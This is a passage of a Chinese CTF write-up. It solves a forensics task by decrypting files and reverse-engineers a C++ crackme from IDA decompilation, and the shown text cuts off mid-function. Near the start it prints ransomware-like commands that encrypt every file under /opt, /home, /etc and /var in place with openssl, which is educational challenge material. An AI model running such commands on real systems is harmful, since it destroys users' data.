<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I understand that, without my agreement, Alpine F1 have put out a press release late this afternoon that I am driving for them next year. This is wrong and I have not signed a contract with Alpine for 2023. I will not be driving for Alpine next year.</span><br></pre></td></tr></table></figure>

<p>而原来的命令是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find /opt/ -<span class="built_in">type</span> f | openssl enc -aes-256-cbc -pass file:key -<span class="keyword">in</span>  <span class="variable">$glbf</span>  -out  <span class="variable">$glbf</span></span><br><span class="line">find /home/ -<span class="built_in">type</span> f | openssl enc -aes-256-cbc -pass file:key -<span class="keyword">in</span>  <span class="variable">$glbf</span>  -out  <span class="variable">$glbf</span></span><br><span class="line">find /etc/ -<span class="built_in">type</span> f | openssl enc -aes-256-cbc -pass file:key -<span class="keyword">in</span>  <span class="variable">$glbf</span>  -out  <span class="variable">$glbf</span></span><br><span class="line">find /var/ -<span class="built_in">type</span> f | openssl enc -aes-256-cbc -pass file:key -<span class="keyword">in</span>  <span class="variable">$glbf</span>  -out  <span class="variable">$glbf</span></span><br></pre></td></tr></table></figure>
<p>对文件进行解密<code>openssl enc -d -aes-256-cbc -pass file:A -in enc -out dec</code>得到flag：<font color=deepskyblue><strong>dam{unattended_arch_boxes_will_be_given_powershell}</strong></font>.</p>
<h1 id="Is-it-data-or-data"><a href="#Is-it-data-or-data" class="headerlink" title="Is it data or data?"></a>Is it data or data?</h1><p>先查看init_array：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.init_array:</span>0000000000005A68 <span class="comment">; ELF Initialization Function Table</span></span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A68 <span class="comment">; ===========================================================================</span></span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A68</span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A68 <span class="comment">; Segment type: Pure data</span></span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A68 <span class="comment">; Segment permissions: Read/Write</span></span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A68 _init_array     <span class="meta">segment</span> <span class="built_in">qword</span> <span class="meta">public</span> <span class="string">&#x27;DATA&#x27;</span> <span class="meta">use64</span></span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A68                 <span class="meta">assume</span> <span class="built_in">cs</span>:_init_array</span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A68                 <span class="comment">;org 5A68h</span></span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A68 off_5A68        <span class="built_in">dq</span> offset sub_25E0      <span class="comment">; DATA XREF: LOAD:0000000000000168↑o</span></span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A68                                         <span class="comment">; LOAD:00000000000002F0↑o</span></span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A70                 <span class="built_in">dq</span> offset init</span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A70 _init_array     ends</span><br><span class="line"><span class="symbol">.init_array:</span>0000000000005A70</span><br></pre></td></tr></table></figure>

<p>发现有一个初始化函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  obj = &amp;obj + <span class="number">2</span>;</span><br><span class="line">  std::string::_M_construct&lt;<span class="type">char</span> <span class="type">const</span>*&gt;(&amp;obj, <span class="string">&quot;inagalaxyfarfaraway&quot;</span>);</span><br><span class="line">  __cxa_atexit((<span class="built_in">void</span> (__fastcall *)(<span class="type">void</span> *))&amp;std::string::~string, &amp;obj, &amp;dso_handle);</span><br><span class="line">  s2 = &amp;s2 + <span class="number">2</span>;</span><br><span class="line">  std::string::_M_construct&lt;<span class="type">char</span> <span class="type">const</span>*&gt;(&amp;s2, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit((<span class="built_in">void</span> (__fastcall *)(<span class="type">void</span> *))&amp;std::string::~string, &amp;s2, &amp;dso_handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>里面初始化了一个密钥<code>obj</code>：<code>inagalaxyfarfaraway</code>，接下来查看main：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)<span class="built_in">func1</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( !(<span class="type">unsigned</span> __int8)<span class="built_in">func2</span>() )</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line">    ++idx;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">check</span>() )</span><br><span class="line">      <span class="built_in">giveflag</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现是一个死循环，func1和2均在等待满足某个条件，查看第一个函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 n; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 n15_1; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 n15; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( idx == <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    n = n_0; <span class="comment">//全局值</span></span><br><span class="line">    n15_1 = n_0 + <span class="number">1LL</span>; <span class="comment">//下一个值</span></span><br><span class="line">    <span class="keyword">if</span> ( s2 == &amp;::n15 ) <span class="comment">//如果被设置了指针</span></span><br><span class="line">      n15 = <span class="number">15LL</span>; <span class="comment">//设置限制15</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      n15 = ::n15; <span class="comment">//否则指向全局的n15</span></span><br><span class="line">    <span class="keyword">if</span> ( n15 &lt; n15_1 ) <span class="comment">//如果当前字符串的空间不足，调用 _M_mutate 来扩展字符串空间。</span></span><br><span class="line">      std::string::_M_mutate(&amp;s2, n_0, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">1LL</span>);</span><br><span class="line">    *((_BYTE *)s2 + n) = <span class="number">103</span>; <span class="comment">//在 s2 字符串的第 n 个位置写入g</span></span><br><span class="line">    n_0 = n15_1;</span><br><span class="line">    *((_BYTE *)s2 + n + <span class="number">1</span>) = <span class="number">0</span>; <span class="comment">//并在下一个字节写入 0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现只有idx为7时才触发，说明从第八步时执行，查看第二个函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> n32; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// ebx</span></span><br><span class="line">  _QWORD *lineIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> byte5; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> n13; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> n5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> n6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> n7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> n15; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> n9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> n10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">void</span> *p_n10; <span class="comment">// [rsp+10h] [rbp-268h] BYREF</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+18h] [rbp-260h]</span></span><br><span class="line">  _QWORD v19[<span class="number">2</span>]; <span class="comment">// [rsp+20h] [rbp-258h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *p_n10_1[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-248h] BYREF</span></span><br><span class="line">  _QWORD v21[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-238h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *s1[<span class="number">2</span>]; <span class="comment">// [rsp+50h] [rbp-228h] BYREF</span></span><br><span class="line">  _QWORD v23[<span class="number">2</span>]; <span class="comment">// [rsp+60h] [rbp-218h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *s1_1[<span class="number">2</span>]; <span class="comment">// [rsp+70h] [rbp-208h] BYREF</span></span><br><span class="line">  _QWORD v25[<span class="number">2</span>]; <span class="comment">// [rsp+80h] [rbp-1F8h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v26; <span class="comment">// [rsp+90h] [rbp-1E8h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+98h] [rbp-1E0h]</span></span><br><span class="line">  _QWORD v28[<span class="number">2</span>]; <span class="comment">// [rsp+A0h] [rbp-1D8h] BYREF</span></span><br><span class="line">  _QWORD *p_x4; <span class="comment">// [rsp+B0h] [rbp-1C8h] BYREF</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+B8h] [rbp-1C0h]</span></span><br><span class="line">  <span class="type">char</span> *x1; <span class="comment">// [rsp+C0h] [rbp-1B8h] BYREF</span></span><br><span class="line">  _QWORD v32[<span class="number">7</span>]; <span class="comment">// [rsp+C8h] [rbp-1B0h] BYREF</span></span><br><span class="line">  _BYTE v33[<span class="number">8</span>]; <span class="comment">// [rsp+100h] [rbp-178h] BYREF</span></span><br><span class="line">  <span class="type">int</span> n24; <span class="comment">// [rsp+108h] [rbp-170h]</span></span><br><span class="line">  <span class="type">void</span> *v35; <span class="comment">// [rsp+110h] [rbp-168h] BYREF</span></span><br><span class="line">  _QWORD v36[<span class="number">2</span>]; <span class="comment">// [rsp+120h] [rbp-158h] BYREF</span></span><br><span class="line">  _QWORD v37[<span class="number">28</span>]; <span class="comment">// [rsp+130h] [rbp-148h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v38; <span class="comment">// [rsp+210h] [rbp-68h]</span></span><br><span class="line">  <span class="type">char</span> v39; <span class="comment">// [rsp+211h] [rbp-67h]</span></span><br><span class="line">  __int64 v40; <span class="comment">// [rsp+218h] [rbp-60h]</span></span><br><span class="line">  __int64 v41; <span class="comment">// [rsp+220h] [rbp-58h]</span></span><br><span class="line">  __int64 v42; <span class="comment">// [rsp+228h] [rbp-50h]</span></span><br><span class="line">  __int64 v43; <span class="comment">// [rsp+230h] [rbp-48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v44; <span class="comment">// [rsp+238h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  v44 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  p_n10 = v19;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v19[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  p_n10_1[<span class="number">0</span>] = v21;</span><br><span class="line">  p_n10_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v21[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  s1[<span class="number">0</span>] = v23;</span><br><span class="line">  std::string::_M_construct&lt;<span class="type">char</span> <span class="type">const</span>*&gt;(s1, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">  s1_1[<span class="number">0</span>] = v25;</span><br><span class="line">  std::string::_M_construct&lt;<span class="type">char</span> <span class="type">const</span>*&gt;(s1_1, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">  v26 = v28;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v28[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  std::__ostream_insert&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;&gt; &quot;</span>, <span class="number">2</span>);</span><br><span class="line">  v0 = *(_QWORD *)(std::cin[<span class="number">0</span>] - <span class="number">24LL</span>);</span><br><span class="line">  v1 = *(_BYTE **)((<span class="type">char</span> *)&amp;std::cin[<span class="number">30</span>] + v0);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    std::__throw_bad_cast();</span><br><span class="line">  <span class="keyword">if</span> ( v1[<span class="number">56</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    n32 = v1[<span class="number">67</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::ctype&lt;<span class="type">char</span>&gt;::_M_widen_init(*(_QWORD *)((<span class="type">char</span> *)&amp;std::cin[<span class="number">30</span>] + v0));</span><br><span class="line">    n32 = (*(__int64 (__fastcall **)(_BYTE *, __int64))(*(_QWORD *)v1 + <span class="number">48LL</span>))(v1, <span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  std::getline&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;(std::cin, &amp;p_n10, (<span class="type">unsigned</span> <span class="type">int</span>)n32);</span><br><span class="line">  std::ios_base::<span class="built_in">ios_base</span>((std::ios_base *)v37);</span><br><span class="line">  v37[<span class="number">0</span>] = &amp;x8;</span><br><span class="line">  v37[<span class="number">27</span>] = <span class="number">0</span>;</span><br><span class="line">  v38 = <span class="number">0</span>;</span><br><span class="line">  v39 = <span class="number">0</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">0</span>;</span><br><span class="line">  v43 = <span class="number">0</span>;</span><br><span class="line">  p_x4 = (_QWORD *)p__ZSt3cin;</span><br><span class="line">  *(_QWORD **)((<span class="type">char</span> *)&amp;p_x4 + *(_QWORD *)(p__ZSt3cin - <span class="number">24LL</span>)) = (_QWORD *)x0;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  std::ios::<span class="built_in">init</span>((<span class="type">char</span> *)&amp;p_x4 + *(p_x4 - <span class="number">3</span>), <span class="number">0</span>);</span><br><span class="line">  x1 = (<span class="type">char</span> *)::x1;</span><br><span class="line">  *(_QWORD *)((<span class="type">char</span> *)&amp;v32[<span class="number">-1</span>] + *(_QWORD *)(::x1 - <span class="number">24LL</span>)) = x2;</span><br><span class="line">  std::ios::<span class="built_in">init</span>((<span class="type">char</span> *)&amp;v32[<span class="number">-1</span>] + *((_QWORD *)x1 - <span class="number">3</span>), <span class="number">0</span>);</span><br><span class="line">  p_x4 = (_QWORD *)p__ZSt3cin_0;</span><br><span class="line">  *(_QWORD **)((<span class="type">char</span> *)&amp;p_x4 + *(_QWORD *)(p__ZSt3cin_0 - <span class="number">24LL</span>)) = (_QWORD *)x3;</span><br><span class="line">  p_x4 = &amp;x4;</span><br><span class="line">  v37[<span class="number">0</span>] = &amp;x5;</span><br><span class="line">  x1 = (<span class="type">char</span> *)&amp;x5 - <span class="number">40</span>;</span><br><span class="line">  v32[<span class="number">0</span>] = &amp;x6;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v32[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">  std::locale::<span class="built_in">locale</span>((std::locale *)v33);</span><br><span class="line">  v32[<span class="number">0</span>] = &amp;x7;</span><br><span class="line">  n24 = <span class="number">0</span>;</span><br><span class="line">  v35 = v36;</span><br><span class="line">  <span class="keyword">if</span> ( v18 != <span class="number">0</span> &amp;&amp; p_n10 == <span class="number">0</span> )</span><br><span class="line">    std::__throw_logic_error(<span class="string">&quot;basic_string: construction from null is not valid&quot;</span>);</span><br><span class="line">  std::string::_M_construct&lt;<span class="type">char</span> <span class="type">const</span>*&gt;(&amp;v35, p_n10);</span><br><span class="line">  n24 = <span class="number">24</span>;</span><br><span class="line">  std::stringbuf::_M_sync(v32, v35, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  std::ios::<span class="built_in">init</span>(v37, v32);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    lineIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7 = (_QWORD *)std::getline&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">                                                                                  &amp;p_x4,</span><br><span class="line">                                                                                  p_n10_1,</span><br><span class="line">                                                                                  <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (*((_BYTE *)lineIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7</span><br><span class="line">          + *(_QWORD *)(*lineIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7 - <span class="number">24LL</span>)</span><br><span class="line">          + <span class="number">32</span>)</span><br><span class="line">        &amp; <span class="number">5</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i == <span class="number">1</span> )</span><br><span class="line">        std::string::_M_assign(s1_1, p_n10_1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      std::string::_M_assign(s1, p_n10_1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">stoi</span>((__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol, <span class="string">&quot;stoi&quot;</span>, (__int64)s1[<span class="number">0</span>], <span class="number">0</span>, <span class="number">10u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">stoi</span>(</span><br><span class="line">                       (__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol,</span><br><span class="line">                       <span class="string">&quot;stoi&quot;</span>,</span><br><span class="line">                       (__int64)s1[<span class="number">0</span>],</span><br><span class="line">                       <span class="number">0</span>,</span><br><span class="line">                       <span class="number">10u</span>) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte5 = (<span class="type">unsigned</span> __int8)::byte5;</span><br><span class="line">    <span class="keyword">if</span> ( ::byte5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s1_1[<span class="number">1</span>] != (<span class="type">void</span> *)<span class="number">1</span> || *(_BYTE *)s1_1[<span class="number">0</span>] != <span class="number">48</span> || (byte5 = <span class="number">0</span>, i != <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">stoi</span>((__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol, <span class="string">&quot;stoi&quot;</span>, (__int64)s1_1[<span class="number">0</span>], <span class="number">0</span>, <span class="number">10u</span>);</span><br><span class="line">        v6 = <span class="built_in">stoi</span>((__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol, <span class="string">&quot;stoi&quot;</span>, (__int64)s1_1[<span class="number">0</span>], <span class="number">0</span>, <span class="number">10u</span>);</span><br><span class="line">        byte5 = <span class="built_in">case1</span>(v6);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">stoi</span>(</span><br><span class="line">                            (__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol,</span><br><span class="line">                            <span class="string">&quot;stoi&quot;</span>,</span><br><span class="line">                            (__int64)s1[<span class="number">0</span>],</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="number">0xAu</span>) == <span class="number">11</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">case11</span>();</span><br><span class="line">    byte5 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    n13 = <span class="built_in">stoi</span>((__int64 (__fastcall *)(__int64, _QWORD *, _QWORD))&amp;_isoc23_strtol, <span class="string">&quot;stoi&quot;</span>, (__int64)s1[<span class="number">0</span>], <span 